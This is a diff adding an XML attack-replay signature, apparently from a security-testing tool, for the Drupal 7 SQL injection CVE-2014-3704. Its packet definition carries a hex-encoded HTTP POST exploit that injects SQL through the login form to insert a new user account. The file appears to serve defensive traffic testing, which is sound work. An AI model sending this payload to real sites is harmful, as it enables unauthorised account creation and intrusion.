@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Drupal Core database.inc expandArguments SQL Injection"/>
+    <EngDesc display="true" value="A SQL injection vulnerability has been found in Drupal Core. The vulnerability is due to insufficient validation of user-supplied data when expanding argument values used in SQL queries. A remote, unauthenticated attacker can exploit this vulnerability by sending a specially crafted parameter to a Drupal Core server. Successful exploitation could lead to arbitrary code execution under the security context of the server."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Drupal"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Drupal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="7.x_versions_prior_to_7.32"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20141016-03"/>
+    <CVEID display="true" value="CVE-2014-3704"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="113371"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="64aab66025e21e5c6be3e3b01a08d806"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635551857257437216"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1419589822" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:62:0E" destMac="00:50:56:B4:44:4C" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01BD" Identification="899C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="467B" srcIP="172.16.8.152" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="36050" destPort="$HTTPdestPort" SeqNumber="4B58E023" AckNumber="C09AC9D1" HeaderLength="08" WindowSize="00E5" Checksum="B898" UrgentPointer="0000" Options="0101080A120569B803C77C7A" Payload="504F5354202F20485454502F312E310D0A486F73743A206C6F63616C686F73740D0A557365722D4167656E743A2054454C55532D53656375726974792D4C6162730D0A4163636570743A202A2F2A0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A436F6E74656E742D4C656E6774683A3234320D0A0D0A6E616D655B302532303B696E736572742B696E746F2B75736572732B287374617475732C7569642C6E616D652C70617373292B53454C4543542B312C2B4D41582875696429253242312C2754534C272C2724532443546F3947374C783268596B374852326E715A78493274727655586B56573764676538486376465861435978557048592E786357272B46524F4D2B75736572733B3B232532302532305D3D69676E6F7265266E616D655B305D3D69676E6F726526706173733D69676E6F726526666F726D5F6275696C645F69643D26666F726D5F69643D757365725F6C6F67696E5F626C6F636B266F703D4C6F672B696E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
